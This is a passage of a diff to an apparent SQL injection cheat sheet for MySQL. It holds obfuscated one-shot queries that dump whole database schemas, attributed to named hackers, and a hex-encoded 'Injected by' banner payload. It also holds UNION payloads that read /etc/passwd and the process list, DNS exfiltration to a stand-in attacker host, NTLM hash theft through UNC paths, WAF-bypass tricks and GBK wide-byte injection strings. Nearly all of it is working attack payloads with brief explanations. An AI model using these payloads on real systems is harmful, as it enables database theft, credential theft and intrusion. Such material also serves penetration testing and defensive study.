-+/*!13337concat*/(0x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a6563746564206279204e315a344d3c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3e203c2f666f6e743e,database/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643936223e56657273696f6e207e3e3e203c2f666f6e743e,@@version,0x3c62723e3c666f6e7420636f6c6f723d2223306637363964223e55736572207e3e3e203c2f666f6e743e,user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643365223e506f7274207e3e3e203c2f666f6e743e,@@port,0x3c62723e3c666f6e7420636f6c6f723d2223346435613733223e4f53207e3e3e203c2f666f6e743e,@@version_compile_os,0x2c3c62723e3c666f6e7420636f6c6f723d2223366134343732223e44617461204469726563746f7279204c6f636174696f6e207e3e3e203c2f666f6e743e,@@datadir,0x3c62723e3c666f6e7420636f6c6f723d2223333130343362223e55554944207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223363930343637223e43757272656e742055736572207e3e3e203c2f666f6e743e,current_user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223383432303831223e54656d70204469726563746f7279207e3e3e203c2f666f6e743e,@@tmpdir,0x3c62723e3c666f6e7420636f6c6f723d2223396336623934223e424954532044455441494c53207e3e3e203c2f666f6e743e,@@version_compile_machine,0x3c62723e3c666f6e7420636f6c6f723d2223396630613838223e46494c452053595354454d207e3e3e203c2f666f6e743e,@@CHARACTER_SET_FILESYSTEM,0x3c62723e3c666f6e7420636f6c6f723d2223393234323564223e486f7374204e616d65207e3e3e203c2f666f6e743e,@@hostname,0x3c62723e3c666f6e7420636f6c6f723d2223393430313333223e53797374656d2055554944204b6579207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223613332363531223e53796d4c696e6b20207e3e3e203c2f666f6e743e,@@GLOBAL.have_symlink,0x3c62723e3c666f6e7420636f6c6f723d2223353830633139223e53534c207e3e3e203c2f666f6e743e,@@GLOBAL.have_ssl,0x3c62723e3c666f6e7420636f6c6f723d2223393931663333223e42617365204469726563746f7279207e3e3e203c2f666f6e743e,@@basedir,0x3c62723e3c2f616464726573733e3c62723e3c666f6e7420636f6c6f723d22626c7565223e,(/*!13337select*/(@a)/*!13337from*/(/*!13337select*/(@a:=0x00),(/*!13337select*/(@a)/*!13337from*/(information_schema.columns)/*!13337where*/(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=/*!13337concat*/(@a,table_schema,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,table_name,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,column_name,0x3c62723e))))a))+
-
--- sharik
-(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
 ```
+
+* SecurityIdiots
+    ```sql
+    make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
+    ```
+
+* Profexer
+    ```sql
+    (select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)
+    ```
+
+* Dr.Z3r0
+    ```sql
+    (select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))
+    ```
+
+* M@dBl00d
+    ```sql
+    (Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
+    ```
+
+* Zen
+    ```sql
+    +make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
+    ```
+
+* sharik
+    ```sql
+    (select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
+    ```
 
 
 ## MYSQL Current Queries
 
-This table can list all operations that DB is performing at the moment.
+`INFORMATION_SCHEMA.PROCESSLIST` is a special table available in MySQL and MariaDB that provides information about active processes and threads within the database server. This table can list all operations that DB is performing at the moment.
+
+The `PROCESSLIST` table contains several important columns, each providing details about the current processes. Common columns include: 
+
+* **ID** : The process identifier.
+* **USER** : The MySQL user who is running the process.
+* **HOST** : The host from which the process was initiated.
+* **DB** : The database the process is currently accessing, if any.
+* **COMMAND** : The type of command the process is executing (e.g., Query, Sleep).
+* **TIME** : The time in seconds that the process has been running.
+* **STATE** : The current state of the process.
+* **INFO** : The text of the statement being executed, or NULL if no statement is being executed.
+     
+```sql
+SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
+```
+
+| ID  | USER      | HOST 	         | DB 	   | COMMAND | TIME | STATE      | INFO | 
+| --- | --------- | ---------------- | ------- | ------- | ----	| ---------- | ---- | 
+| 1	  | root	  | localhost        | testdb  | Query	 | 10	| executing	 | SELECT * FROM some_table | 
+| 2	  | app_uset  | 192.168.0.101    | appdb   | Sleep	 | 300	| sleeping	 | NULL |
+| 3	  | gues_user | example.com:3360 | NULL	   | Connect | 0    | connecting | NULL |
+
 
 ```sql
-union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #
-
--- Dump in one shot example for the table content.
-union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 #
+UNION SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #
 ```
+
+Dump in one shot query to extract the whole content of the table.
+
+```sql
+UNION SELECT 1,(SELECT(@)FROM(SELECT(@:=0X00),(SELECT(@)FROM(information_schema.processlist)WHERE(@)IN(@:=CONCAT(@,0x3C62723E,state,0x3a,info))))a),3,4 #
+```
+
 
 ## MYSQL Read Content of a File
 
 Need the `filepriv`, otherwise you will get the error : `ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`
 
 ```sql
-' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
-```
-
-```sql
+UNION ALL SELECT LOAD_FILE('/etc/passwd') --
 UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
 ```
 
@@ -519,6 +548,7 @@ Then you can use functions such as `sys_exec` and `sys_eval`.
 ```sql
 $ mysql -u root -p mysql
 Enter password: [...]
+
 mysql> SELECT sys_eval('id');
 +--------------------------------------------------+
 | sys_eval('id') |
@@ -560,42 +590,33 @@ In MYSQL "`admin `" and "`admin`" are the same. If the username column in the da
 Payload: `username = "admin               a"`
 
 
-## MYSQL json_arrayagg
-
-Requirement: `MySQL >= 5.7.22`
-
-Use `json_arrayagg()` instead of `group_concat()` which allows less symbols to be displayed
-* group_concat() = 1024 symbols
-* json_arrayagg() > 16,000,000 symbols
-
-```sql
-SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
-```
-
-
 ## MYSQL Out of Band
 
 ```powershell
-select @@version into outfile '\\\\192.168.0.100\\temp\\out.txt';
-select @@version into dumpfile '\\\\192.168.0.100\\temp\\out.txt
+SELECT @@version INTO OUTFILE '\\\\192.168.0.100\\temp\\out.txt';
+SELECT @@version INTO DUMPFILE '\\\\192.168.0.100\\temp\\out.txt;
 ```
 
 ### DNS Exfiltration
 
 ```sql
-select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
-select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))
+SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.hacker.site\\a.txt'));
+SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e6861636b65722e736974655c5c612e747874))
 ```
 
 ### UNC Path - NTLM Hash Stealing
 
+The term "UNC path" refers to the Universal Naming Convention path used to specify the location of resources such as shared files or devices on a network. It is commonly used in Windows environments to access files over a network using a format like `\\server\share\file`.
+
 ```sql
-select load_file('\\\\error\\abc');
-select load_file(0x5c5c5c5c6572726f725c5c616263);
-select 'osanda' into dumpfile '\\\\error\\abc';
-select 'osanda' into outfile '\\\\error\\abc';
-load data infile '\\\\error\\abc' into table database.table_name;
+SELECT LOAD_FILE('\\\\error\\abc');
+SELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);
+SELECT '' INTO DUMPFILE '\\\\error\\abc';
+SELECT '' INTO OUTFILE '\\\\error\\abc';
+LOAD DATA INFILE '\\\\error\\abc' INTO TABLE DATABASE.TABLE_NAME;
 ```
+
+:warning: Don't forget to escape the '\\\\'.
 
 
 ## MYSQL WAF Bypass
@@ -605,7 +626,7 @@ load data infile '\\\\error\\abc' into table database.table_name;
 `information_schema.tables` alternative
 
 ```sql
-select * from mysql.innodb_table_stats;
+SELECT * FROM mysql.innodb_table_stats;
 +----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
 | database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
 +----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
@@ -614,7 +635,7 @@ select * from mysql.innodb_table_stats;
 ...
 +----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
 
-mysql> show tables in dvwa;
+mysql> SHOW TABLES IN dvwa;
 +----------------+
 | Tables_in_dvwa |
 +----------------+
@@ -624,24 +645,24 @@ mysql> show tables in dvwa;
 ```
 
 
-### Alternative to version
+### Alternative to Version
 
 ```sql
-mysql> select @@innodb_version;
+mysql> SELECT @@innodb_version;
 +------------------+
 | @@innodb_version |
 +------------------+
 | 5.6.31           |
 +------------------+
 
-mysql> select @@version;
+mysql> SELECT @@version;
 +-------------------------+
 | @@version               |
 +-------------------------+
 | 5.6.31-0ubuntu0.15.10.1 |
 +-------------------------+
 
-mysql> mysql> select version();
+mysql> mysql> SELECT version();
 +-------------------------+
 | version()               |
 +-------------------------+
@@ -650,17 +671,32 @@ mysql> mysql> select version();
 ```
 
 
+### Alternative to group_concat
+
+Requirement: `MySQL >= 5.7.22`
+
+Use `json_arrayagg()` instead of `group_concat()` which allows less symbols to be displayed
+* `group_concat()` = 1024 symbols
+* `json_arrayagg()` > 16,000,000 symbols
+
+```sql
+SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
+```
+
+
 ### Scientific Notation
 
 In MySQL, the e notation is used to represent numbers in scientific notation. It's a way to express very large or very small numbers in a concise format. The e notation consists of a number followed by the letter e and an exponent.
 The format is: `base 'e' exponent`.
 
-For example: 
+For example:
+
 * `1e3` represents `1 x 10^3` which is `1000`. 
 * `1.5e3` represents `1.5 x 10^3` which is `1500`. 
 * `2e-3` represents `2 x 10^-3` which is `0.002`. 
 
-The following queries are equivalent: 
+The following queries are equivalent:
+
 * `SELECT table_name FROM information_schema 1.e.tables` 
 * `SELECT table_name FROM information_schema .tables` 
 
@@ -670,10 +706,13 @@ This technique can be used to obfuscate queries to bypass WAF, for example: `1.e
 
 ### Conditional Comments
 
-* `/*! ... */`: This is a conditional MySQL comment. The code inside this comment will be executed only if the MySQL version is greater than or equal to the number immediately following the `/*!`. If the MySQL version is less than the specified number, the code inside the comment will be ignored. 
-    * `/*!12345UNION*/`: This means that the word UNION will be executed as part of the SQL statement if the MySQL version is 12.345 or higher.
-    * `/*!31337SELECT*/`: Similarly, the word SELECT will be executed if the MySQL version is 31.337 or higher.
-Examples: `/*!12345UNION*/`, `/*!31337SELECT*/`
+MySQL conditional comments are enclosed within `/*! ... */` and can include a version number to specify the minimum version of MySQL that should execute the contained code.
+The code inside this comment will be executed only if the MySQL version is greater than or equal to the number immediately following the `/*!`. If the MySQL version is less than the specified number, the code inside the comment will be ignored. 
+
+* `/*!12345UNION*/`: This means that the word UNION will be executed as part of the SQL statement if the MySQL version is 12.345 or higher.
+* `/*!31337SELECT*/`: Similarly, the word SELECT will be executed if the MySQL version is 31.337 or higher.
+
+**Examples**: `/*!12345UNION*/`, `/*!31337SELECT*/`
 
 
 ### Wide Byte Injection (GBK)
@@ -690,7 +729,7 @@ Several characters can be used to triger the injection.
 
 A lot of payloads can be created such as:
 
-```
+```sql
 %A8%27 OR 1=1;--
 %8C%A8%27 OR 1=1--
 %bf' OR 1=1 -- --
